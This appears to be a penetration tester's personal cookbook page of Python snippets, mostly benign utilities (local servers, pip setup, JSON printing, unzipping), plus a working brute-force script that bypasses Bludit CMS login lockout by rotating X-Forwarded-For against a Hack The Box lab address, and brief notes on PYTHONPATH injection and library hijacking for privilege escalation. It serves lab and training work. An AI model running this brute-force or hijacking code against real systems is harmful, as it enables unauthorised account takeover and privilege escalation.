---
layout: default
title: Python
parent: COOKBOOKS
has_children: false
has_toc: false
---

{% include toc.html %}

## References
https://askubuntu.com/questions/86849/how-to-unzip-a-zip-file-from-the-terminal


## Start a local http server
```Python
python3 -m http.server 
python3 -m http.server [port]
python3 -m http.server [--directory IF-NOT-LOCAL] [port]
```

## Start a local ftp server
*Install using `sudo apt install python3-pyftpdlib`.*

```Python
python3 -m pyftpdlib
```

## Installing Python 3.8 and Pip on Windows
Go to `python.org` and download the latest release for Windows. Download and install, **making sure to check the `add to path` checkbox during installation**. Check the installation by testing the Python version at the command line:
```Python
python --version
```

To install Pip, go to `https://bootstrap.pypa.io/get-pip.py` to download the `get-pip.py` file. To install, run:
```Python
python get-pip.py
```

One-liner (credit Heath Adams' Windows PrivEsc Udemy course):
```
curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py; python get-pip.py
```

After installation, check the Pip version:
```Python
pip --version
```

## Pip3 update all packages
Kept getting a `missing required parameter 'digestmod'` error when trying to run `crackmapexec` and `impacket`. This seems to be a Python3.8 issue, resolved by updating everything using this command from the HTB forum:
```Python
pip3 list --outdated --format=freeze | grep -v '^-e' | cut -d = -f 1 | xargs -n1 pip3 install -U
```

## Extracting a CSRF token
```Python
import requests
from bs4 import BeautifulSoup

session = requests.session()
page = session.get(url)
soup = BeautifulSoup(page.text, features='lxml')
csrf = soup.find('input', {'name': 'tokenCSRF'})['value']
```

## Bypassing Bludit admin login lockout
```Python
import requests
from bs4 import BeautifulSoup

URL='http://10.10.10.191/admin/login/'

def go(users, passwords):
	for user in users:
		for password in passwords:
			session = requests.session()
			login_page = session.get(URL)
			if login_page.status_code == 200:
				soup = BeautifulSoup(login_page.text, features='lxml')
				csrf = soup.find('input', {'name': 'tokenCSRF'})['value']

				headers = {
					'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
					'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
					'Content-Type': 'application/x-www-form-urlencoded',
					'Cookie': 'BLUDIT-KEY=c59jcu33ghe4rbjb3gimngdau2',
					'X-Forwarded-For': f'{user}{password}', # Setting the X-Forwarded-For to a unique value each time bypasses IP blocking
				}

				params = {
					'tokenCSRF': csrf,
					'username': user,
					'password': password,
					'save': ''
				}

				login_result = session.post(URL, headers = headers, data = params)
				if login_result.status_code == 200:
					if 'location' in login_result.headers:
						location = login_result.headers['location']
						print(f'location: {location}')
						if '/admin/dashboard' in location:
							print(f'[*] {user}:{password} - success!')
							return
					else:
						print(f'[ ] {user}:{password} csrf: {csrf}')
				else:
					print(f'Request to login failed: {login_result.status_code}')
					return
			else:
				print(f'Request for login page failed: {login_page.status_code}')
				return

def getItemsFrom(path):
	return list(filter(None, open(path, 'r').read().split('\n')))


if __name__ == '__main__':
	users = getItemsFrom('/home/kali/HTB/Blunder/wordlists/user-list')
	passwords = getItemsFrom('/home/kali/HTB/Blunder/wordlists/cewl-wordlist')	
	go(users, passwords)
```

## Pretty print json
```Bash
cat file.json | python3 -m json.tool > pretty-printed.json
```

## Include PYTHONPATH in Call (PYTHONPATH Exploit)
You can temporarily include a directory as part of the python path by calling your script using the `PYTHONPATH` variable. This means you can potentially inject a rogue `.py` script into the process by adding the path containing the rogue script to the `PYTHONPATH` variable. For example:
```Bash
// Call a python script.
PYTHONPATH=/path/to/script-to-include.py python3 some-python-script.py

// Or non-python scripts using sudo providing an elevated context.
sudo PYTHONPATH=/path/to/script-to-include.py /path/to/shell-script.sh
```

https://stackoverflow.com/questions/4580101/python-add-pythonpath-during-command-line-module-run/4580120

## Library Hijacking
It may be possible to inject a rogue python library ahead of the official one, depending on the path. If you can write to a folder earlier in the path than the 'official' library, you could inject your own library instead. To check the path, you can use: 
```Python
python -c 'import sys; print(sys.path)'
```

https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7

## Creating an all-in-one Executable from a Python Script
Do this on the machine architecture you want to created, so if you want a Windows executable, use a Windows machine to build it, such as `CommandoVM`.
```Python
// Install pyinstaller.
pip3 install pyinstaller

// Build the executable, the file will be available in the dist folder
pyinstaller --onefile source-script.py
```

## Unzip a file
```Python
import sys
from zipfile import PyZipFile
PyZipFile("/home/user/file.zip").extractall()
```